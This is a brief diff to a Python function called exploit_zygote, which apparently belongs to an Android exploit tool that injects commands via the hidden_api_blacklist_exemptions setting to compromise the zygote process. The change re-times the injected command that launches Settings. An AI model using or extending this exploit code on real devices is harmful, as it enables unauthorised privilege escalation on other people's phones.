@@ -3479,6 +3479,7 @@ def exploit_zygote(zip_path, text, prog_text, change):
             payload
     )
     if method == "new":
+        exploit_command += f"\n\"\nsleep 0.25\nam start -a android.settings.SETTINGS"
         device.shell("am force-stop com.android.settings")
     else:
         exploit_command += f"\n\"\nsettings delete global hidden_api_blacklist_exemptions\nsleep 2\n"
@@ -3486,7 +3487,7 @@ def exploit_zygote(zip_path, text, prog_text, change):
     except: pass
     if method == "new":
         time.sleep(0.25)
-        device.shell("am start -a android.settings.SETTINGS")
+        #device.shell("am start -a android.settings.SETTINGS")
         device.shell("input keyevent KEYCODE_HOME")
     else:
         time.sleep(0.25)
